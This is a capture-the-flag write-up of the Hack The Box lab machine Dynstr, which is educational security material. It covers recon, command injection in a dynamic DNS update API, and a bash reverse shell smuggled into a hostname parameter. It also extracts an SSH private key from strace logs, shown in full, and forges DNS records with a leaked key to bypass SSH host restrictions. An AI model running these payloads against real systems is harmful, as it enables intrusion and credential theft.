---
title: HTB: Dynstr
url: https://0xdf.gitlab.io/2021/10/16/htb-dynstr.html
date: 2021-10-16T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-dynstr, nmap, dynamic-dns, no-ip, feroxbuster, dnsenum, command-injection, injection, cyberchef, scriptreplay, dns, nsupdate, authorized-keys, wildcard, php, bash, passwd, oscp-plus-v2
---

![Dynstr](https://0xdfimages.gitlab.io/img/dynstr-cover.png)

Dynstr was a super neat concept based around a dynamic DNS provider. To start, I’ll find command injection in the DNS / IP update API. Then I’ll find a private key in a script replay of a debugging session and strace logs. I’ll also need to tinker with the DNS resolutions to allow myself to connect over SSH, as the authorized\_keys file has restrictions in it. For root, there’s a simple wildcard injection into a script I can run as root, and I’ll show two ways to exploit that. In Beyond Root, a break down of the DNS API, and a look at an unintended flag leak and a dive into Bash variables and number comparisons.

## Box Info

| Name | [Dynstr](https://hackthebox.com/machines/dynstr)  [Dynstr](https://hackthebox.com/machines/dynstr) [Play on HackTheBox](https://hackthebox.com/machines/dynstr) |
| --- | --- |
| Release Date | [12 Jun 2021](https://twitter.com/hackthebox_eu/status/1402642148374290433) |
| Retire Date | 16 Oct 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Dynstr |
| Radar Graph | Radar chart for Dynstr |
| First Blood User | 00:42:23[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 00:44:55[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [jkr jkr](https://app.hackthebox.com/users/77141) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), DNS (53), and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.244
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 06:12 EDT
Nmap scan report for 10.10.10.244
Host is up (1.7s latency).
Not shown: 63812 filtered ports, 1720 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 224.94 seconds

oxdf@parrot$ nmap -p 22,53,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.244
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 06:20 EDT
Nmap scan report for 10.10.10.244
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Focal 20.04.

Unsurprisingly given DNS is running on TCP, it is also open on UDP as well:

```

oxdf@parrot$ sudo nmap -sU -p 53 -sCV -oA scans/nmap-udp-dns 10.10.10.244
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 06:26 EDT
Nmap scan report for 10.10.10.244
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
53/udp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

```

### Website - TCP 80

#### Site

The site is for Dyna DNS, a dynamic DNS provider:

[![image-20210613063354567](https://0xdfimages.gitlab.io/img/image-20210613063354567.png)](https://0xdfimages.gitlab.io/img/image-20210613063354567.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210613063354567.png)

I’ve added boxes around four bits of information.
- They use the same API as no-ip.com.
- They provide DNS for `dnsalias.htb`, `dynamicdns.htb`, and `no-ip.htb`.
- Currently in Beta, all customers are using the shared credentials, dynadns / sndanyd.
- There’s a contact email, `dns@dyna.htb`.

[no-ip](https://www.noip.com/) offers dynamic DNS services. Their customers get a subdomain on one of many domains they host from, and can install a client that talks to the API to update that subdomain frequently so that if the IP where the client is running changes, the DNS will update as well.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.244

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.244
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      313c http://10.10.10.244/assets
403        9l       28w      277c http://10.10.10.244/server-status
301        9l       28w      319c http://10.10.10.244/assets/fonts
301        9l       28w      316c http://10.10.10.244/assets/js
301        9l       28w      310c http://10.10.10.244/nic
301        9l       28w      317c http://10.10.10.244/assets/img
301        9l       28w      317c http://10.10.10.244/assets/css
200        1l        1w        8c http://10.10.10.244/nic/update
301        9l       28w      320c http://10.10.10.244/assets/img/bg
301        9l       28w      326c http://10.10.10.244/assets/img/overlays
301        9l       28w      322c http://10.10.10.244/assets/img/logo
[####################] - 1m    299990/299990  0s      found:11      errors:0      
[####################] - 18s    29999/29999   1626/s  http://10.10.10.244
[####################] - 24s    29999/29999   1254/s  http://10.10.10.244/assets
[####################] - 27s    29999/29999   1114/s  http://10.10.10.244/assets/fonts
[####################] - 29s    29999/29999   1010/s  http://10.10.10.244/assets/js
[####################] - 30s    29999/29999   998/s   http://10.10.10.244/nic
[####################] - 30s    29999/29999   983/s   http://10.10.10.244/assets/img
[####################] - 30s    29999/29999   998/s   http://10.10.10.244/assets/css
[####################] - 24s    29999/29999   1223/s  http://10.10.10.244/assets/img/bg
[####################] - 22s    29999/29999   1346/s  http://10.10.10.244/assets/img/overlays
[####################] - 22s    29999/29999   1340/s  http://10.10.10.244/assets/img/logo

```

`assets` is just stuff related to the website. `/nic` and `/nic/update` are interesting.

### DNS - UDP/TCP 53

With DNS on TCP open, I’ll try zone transfers on each of the domains I know about, but without any luck (example for `dyna.htb`):

```

oxdf@parrot$ dig axfr dyna.htb @10.10.10.244

; <<>> DiG 9.16.15-Debian <<>> axfr dyna.htb @10.10.10.244
;; global options: +cmd
; Transfer failed.

```

I can try to brute subdomains across the different domains using `dnsenum`. I actually found one on `no-ip.htb`:

```

oxdf@parrot$ dnsenum --dnsserver 10.10.10.244 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-no-ip.htb-bitquark no-ip.htb
dnsenum VERSION:1.2.6
...[snip]...
Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
________________________________________________________________________________________

test.no-ip.htb.                          30       IN    A        10.10.14.7
...[snip]...

```

This domain is pointing at another player’s IP, so I’ll leave it alone. It is a sign that I’ll be able to set IPs at some point (which fits the theme of the site).

### API

#### Discovery

The first link when Googling “no-ip api” has a page that leads to the API documentation at https://www.noip.com/integrate/request.

![image-20210613135249803](https://0xdfimages.gitlab.io/img/image-20210613135249803.png)

Those match up nicely with what I found with `feroxbuster`. Later it gives this example with auth:

```

http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25

```

#### Try It

I can try that on Dynstr. I’ve got the shared credentials from the webpage above, so I’ll include those. Without an `ip` arg, it sets the domain to my IP:

```

oxdf@parrot$ curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=0xdf.no-ip.htb
good 10.10.14.8
oxdf@parrot$ dig +short 0xdf.no-ip.htb @10.10.10.244
10.10.14.8

```

The `myip` arg will set it to some other IP:

```

oxdf@parrot$ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=0xdf.no-ip.htb&myip=10.10.14.10'
good 10.10.14.10
oxdf@parrot$ dig +short 0xdf.no-ip.htb @10.10.10.244
10.10.14.10

```

It even works with IPs outside of `10.0.0.0/8`.

If I try to update one of the base domains, it fails:

```

oxdf@parrot$ curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=no-ip.htb
911 [wrngdom: htb]

```

The `wrngdom` message is likely “wrong domain”. If I try a longer one that’s not one of the listed domains, it fails as well:

```

oxdf@parrot$ curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=0xdf.ano-ip.htb
911 [wrngdom: ano-ip.htb]

```

The “domain” here must be all but the first word before the first `.`.

## Shell as www-data

### Command Injection Strategy

When thinking about how to attack a webserver like this, it’s useful to think about what server is doing with my input. The way to update a DNS resolution on Bind is typically with `nsupdate`, which means that the webpage is likely calling that as a system command, and that leave open the possibility for command injections.

### Testing API

I’ll start with a couple simple payloads, `;id` (to see if any output came back) and `;ping -c 1 10.10.14.8` to see if there’s a blind injection. I’ll also use `curl` with the `--data-urlencode` parameter to pass GET parameters that it encodes for me.

Both return `wrngdom` errors:

```

oxdf@parrot$ curl -G --data-urlencode 'hostname=;id' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
911 [wrngdom: ]
oxdf@parrot$ curl -G --data-urlencode 'hostname=;ping -c 1 10.10.14.8' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
911 [wrngdom: 10.14.8]

```

The first doesn’t give a domain, but the second gives 10.14.8. It looks like it’s looking for the first `.`, and considering the stuff after it the domain, just like I noticed above. I can test this, and it looks right:

```

oxdf@parrot$ curl -G --data-urlencode 'hostname=a.b.c.d.e.f.g.h.i' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
911 [wrngdom: b.c.d.e.f.g.h.i]

```

I’ve got the list of domains from the website. I’ll try adding something to the end of the injection:

```

oxdf@parrot$ curl -G --data-urlencode 'hostname=;id;0xdf.no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
911 [nsupdate failed]

```

That’s good confirmation that it’s using `nsupdate`, and the fact that I broke it is a good sign that the injection is working.

### Command Injection POCs

#### whoami

I’d like to add a comment after the domain, but then it won’t pass the domain check. I’ll switch from using `;` to end the command to using `$()` to run a subcommand:

```

oxdf@parrot$ curl -G --data-urlencode 'hostname=$(whoami).no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
good 10.10.14.8

```

I chose `whoami` because it was more likely to work returning a single word vs `id`. It seems to have worked. If the web process is running as www-data, then `www-data.no-ip.htb` would resolve to my IP. It does:

```

oxdf@parrot$ dig +short www-data.no-ip.htb @10.10.10.244
10.10.14.8

```

That’s proof of command injection.

#### ping

An easier check would be to try `ping`. The only challenge is that I can’t use `.`. That’s easily bypassed knowing that an IP is just a four-byte integer. It’s standard to represent it as four ints 0-255 combined with `.`, but almost all systems will handle the int value as well. [Cyberchef](https://gchq.github.io/CyberChef/#recipe=Change_IP_format('Dotted%20Decimal','Decimal')&input=MTAuMTAuMTQuOA) has a Change IP Format recipe that works nicely here:

![image-20210613144052430](https://0xdfimages.gitlab.io/img/image-20210613144052430.png)

Dropping that in, with `tcpdump` watching locally, I can `ping`:

```

oxdf@parrot$ curl -G --data-urlencode 'hostname=$(ping -c 1 168431112).no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
911 [nsupdate failed]

```

At `tcpdump`:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:41:19.902625 IP 10.10.10.244 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
14:41:19.902652 IP 10.10.14.8 > 10.10.10.244: ICMP echo reply, id 1, seq 1, length 64
14:41:19.929024 IP 10.10.10.244 > 10.10.14.8: ICMP echo request, id 2, seq 1, length 64
14:41:19.929042 IP 10.10.14.8 > 10.10.10.244: ICMP echo reply, id 2, seq 1, length 64

```

That’s actually two pings, so the injection must have taken place twice.

### Shell

To get a shell, I’ll use the standard Bash reverse shell, just using my IP in decimal form:

```

oxdf@parrot$ curl -G --data-urlencode 'hostname=$(/bin/bash -c "bash -i >& /dev/tcp/168431112/443 0>&1").no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'

```

It hangs, but at a listening `nc`, there’s a shell as www-data (as expected):

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.244] 37680
bash: cannot set terminal process group (716): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade the shell using the standard trick with Python:

```

www-data@dynstr:/var/www/html/nic$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
www-data@dynstr:/var/www/html/nic$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@dynstr:/var/www/html/nic$

```

## Shell as bindmgr

### Enumeration

#### Users

There are two users on the box:

```

www-data@dynstr:/home$ ls
bindmgr  dyna

```

There isn’t much interesting in `dyna`. `bindmgr` has `user.txt`, and a directory:

```

www-data@dynstr:/home/bindmgr$ ls -la
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Jun  9 11:50 user.txt

```

I can’t read `user.txt` yet, but I can access `support-case-C62796521`. There’s also a `.ssh` directory.

#### .ssh

`.ssh` contains four files I would expect to see:

```

www-data@dynstr:/home/bindmgr/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts

```

`id_rsa` and `id_rsa.pub` are likely a key pair. `authorized_keys` defines who can connect (and how). `known_hosts` describes hosts that the client has SSHed to.

I wanted to check if the key here is in `authorized_keys`, and it is:

```

www-data@dynstr:/home/bindmgr/.ssh$ cat authorized_keys 
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
www-data@dynstr:/home/bindmgr/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen

```

There’s also something interesting at the start of the line: `from="*.infra.dyna.htb"`. Florian Roth [tweeted about this](https://twitter.com/cyb3rops/status/1395009709787258882) (after Dynstr had been submitted to HTB, but before it went live):

> TIL authorized\_keys files can contain more than just public keys.   
> You can control source hosts of each key, limit the port forwarding, execute commands upon login.  
> In 20+ years of working on Unix/Linux systems, I've never seen this used. <https://t.co/XZeG9s6srV> [pic.twitter.com/WZ9M3iUKXQ](https://t.co/WZ9M3iUKXQ)
>
> — Florian Roth (@cyb3rops) [May 19, 2021](https://twitter.com/cyb3rops/status/1395009709787258882?ref_src=twsrc%5Etfw)

It’s also in the [man page](http://man.he.net/man5/authorized_keys). So that key can only connect from `*.infra.dyna.htb`. I’m not able to read the private key.

#### Support Case

The support case directory contains four readable files:

```

www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
total 428
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt

```

The files seem to be the output of a debugging session the user is doing. The files can be viewed with `cat` or `less`, but it’s neat to see them with `scriptreplay [.timing file] [.script file]`:

![](https://0xdfimages.gitlab.io/img/scriptreplay.gif)
*If you see a shell as bindmgr, that’s because it’s part of the reply. Wait for the GIF to restart, or refresh the page to see it from the start.*

The users is trying to troubleshoot an SFTP connection using `curl`, and the connection is using the key pair for auth. The important part of the replay is when the admin attaches `strace` to the process, and even saves that to a file:

[![image-20210613153827802](https://0xdfimages.gitlab.io/img/image-20210613153827802.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210613153827802.png)

`strace` will capture the private key as it’s used. `grep` finds it easily:

```

www-data@dynstr:/home/bindmgr/support-case-C62796521$ grep BEGIN strace-C62796521.txt 
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823

```

A bit of `cut` and `sed` will isolate the key:

```

www-data@dynstr:/home/bindmgr/support-case-C62796521$ grep BEGIN strace-C62796521.txt | cut -d'"' -f2 | sed 's/\\n/\'$'\n''/g'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
...[snip]...
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

With the private key, I still can’t connect unless I’m coming from `*.infra.dyna.htb` as shown above.

#### DNS Configuration

`resolve.conf` shows that Dynstr is using itself as a DNS server:

```

www-data@dynstr:/$ cat /etc/resolv.conf | grep -v "^#"
nameserver 127.0.0.1

```

I can try to update the DNS resolver so that my IP has a `*.infra.dyna.htb` name, but it fails:

```

www-data@dynstr:/home/bindmgr/support-case-C62796521$ nsupdate
> server 127.0.0.1
> zone infra.dyna.htb
> update add 0xdf.infra.dyna.htb 30 IN A 10.10.14.8
> send
update failed: NOTAUTH

```

To better understand how the Bind server is configured. There’s a bunch of files in `/etc/bind`:

```

www-data@dynstr:/etc/bind$ ls
bind.keys  db.127  db.empty  ddns.key   named.bindmgr  named.conf.default-zones  named.conf.options  zones.rfc1918
db.0       db.255  db.local  infra.key  named.conf     named.conf.local          rndc.key

```

`named.conf.local` contains the interesting bits:

```

// Add infrastructure DNS updates.
include "/etc/bind/infra.key";
zone "dyna.htb" IN { type master; file "dyna.htb.zone"; update-policy { grant infra-key zonesub ANY; }; };
zone "10.in-addr.arpa" IN { type master; file "10.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
zone "168.192.in-addr.arpa" IN { type master; file "168.192.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
// Enable DynDNS updates to customer zones.
include "/etc/bind/ddns.key";
zone "dnsalias.htb" IN { type master; file "dnsalias.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
zone "dynamicdns.htb" IN { type master; file "dynamicdns.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
zone "no-ip.htb" IN { type master; file "no-ip.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };

```

This second line defines how the `dyna.htb` zone (or domain) is updated. The `update-policy` says that it will be granted with access to the `infra-key` file, which included in the first line. I also have permission to read it as www-data:

```

www-data@dynstr:/etc/bind$ ls -l infra.key
-rw-r--r-- 1 root bind 101 Mar 15 20:44 infra.key

```

### Update DNS

I have all the pieces I need to update the DNS at this point. I could look at the web code as an example of how to make the `nsupdate` call (I’ll dig into that in [Beyond Root](#no-ip-api)), or look at the [man page](https://linux.die.net/man/8/nsupdate). I’ll set it so that both the A record for 0xdf.infra.dyna.htb points at my IP, and that the PTR record for 8.14.10.10.in-addr.arpa points at 0xdf.infra.dyna.htb (to satisfy the reverse lookup of the IP):

```

www-data@dynstr:/etc/bind$ nsupdate -k infra.key 
> server 127.0.0.1
> zone dyna.htb
> update add 0xdf.infra.dyna.htb 30 IN A 10.10.14.8
> send
> zone 10.in-addr.arpa
> update add 8.14.10.10.in-addr.arpa 30 IN PTR 0xdf.infra.dyna.htb
> send

```

### SSH

With those records set, I can SSH as bindmgr:

```

oxdf@parrot$ ssh -i ~/keys/dynstr-bindmgr bindmgr@10.10.10.244
Last login: Sun Jun 13 12:13:42 2021 from 90e30693769f4068a9ffb5a187745264.infra.dyna.htb
bindmgr@dynstr:~$ 

```

## Shell as root

### Enumeration

`sudo -l` gives something interesting right away:

```

bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh

```

bindmgr can run `/usr/local/bin/bindmgr.sh` as root without a password.

### bindmgr.sh

Just running the script returns an error about the version:

```

bindmgr@dynstr:~$ sudo bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
[-] ERROR: Check versioning. Exiting.

```

I am able to read and execute it, but not write:

```

bindmgr@dynstr:~$ ls -l /usr/local/bin/bindmgr.sh 
-rwxr-xr-x 1 root root 2184 Mar 15 20:28 /usr/local/bin/bindmgr.sh

```

I’ll walk through the script in chunks. At the top is has the shebang for a Bash script, some comments, and defines a couple static directories and a macro to indent:

```

#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem           
# that bind/named can only include single files but no directories.            
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included       
# from named.conf.local (or others) and will include all files from the        
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including          
#       named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but         
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.               

BINDMGR_CONF=/etc/bind/named.conf.bindmgr                                      
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }  

```

The comments mention that the script is in development, and designed to create a file to be included by Bind.

Next there are version checks:

```

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

```

To get past this, I’ll need a `.version` file in the local directory that has a number greater than the `.version` file in `/etc/bin/named.bindmgr`.

Now it creates a config file that includes all the files in the local directory:

```

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

```

Next it copies all the files in the local directory to `/etc/bind/named.bindmgr/`:

```

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

```

Finally, it checks that the conf file is valid using `named-checkconf`, and if it is, it has a commented line to restart the bind service using `systemctl` (and a comment saying it’s “TODO once live”):

```

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
